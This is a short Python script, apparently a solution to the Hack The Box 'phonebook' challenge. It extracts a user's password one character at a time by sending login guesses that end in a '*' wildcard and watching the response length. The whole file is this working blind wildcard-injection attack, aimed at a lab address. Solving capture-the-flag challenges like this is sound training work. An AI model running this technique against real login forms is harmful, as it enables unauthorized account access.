#this script is for the htb challenge phonebook
#it tries to guess the correct password using astericks
#please do not religiously follow my comments, I was trying to make sense of the code for me

import requests
from string import ascii_lowercase, ascii_uppercase

url = 'http://138.68.156.206:32567/login' #change this
headers = {'Host': '138.68.156.206:32567', #grab this from burp
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '29',
'Connection': 'close'}

chars = ascii_lowercase + ascii_uppercase + '0123456789_{}()'
passwd = ''

while(1):
	for char in chars:
		tmp = passwd + char + '*'
		data = {'username':'Reese','password':tmp} #this is what we'll be posting
		r = requests.post(url, headers=headers, data=data)

		if r.headers['Content-Length'] == '2586':
			passwd += char
		elif char==')':
			print (passwd)
			break

print (passwd)